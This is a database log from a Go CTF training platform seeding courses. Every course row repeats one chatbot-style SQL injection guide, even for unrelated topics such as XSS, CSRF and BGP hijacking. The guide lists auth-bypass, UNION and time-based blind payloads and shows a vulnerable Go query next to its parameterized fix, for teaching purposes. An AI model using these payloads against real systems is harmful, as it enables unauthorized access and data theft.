   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,19) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.462ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.562ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.759','2025-06-09 14:07:53.759',NULL,'bgp hijacking','Exploiting Border Gateway Protocol vulnerabilities',199,5) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.502ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.424ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 20 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.624ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.766','2025-06-09 14:07:53.766',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,20) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.448ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.636ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.774','2025-06-09 14:07:53.774',NULL,'sql injection','Exploiting database queries through input fields',250,4) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.490ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.476ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 21 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.716ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.781','2025-06-09 14:07:53.781',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,21) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.601ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.615ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.788','2025-06-09 14:07:53.788',NULL,'cross-site scripting (xss)','Injecting malicious scripts into web pages',220,3) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.472ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.410ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 22 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.421ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.795','2025-06-09 14:07:53.795',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,22) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[5.007ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[11.162ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.807','2025-06-09 14:07:53.807',NULL,'cross-site request forgery (csrf)','Forcing users to execute unwanted actions',230,4) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.481ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.433ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 23 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.895ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.814','2025-06-09 14:07:53.814',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,23) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.834ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[10.110ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.823','2025-06-09 14:07:53.823',NULL,'broken authentication','Exploiting weak session management',200,3) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.483ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.424ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 24 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.791ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.832','2025-06-09 14:07:53.832',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---
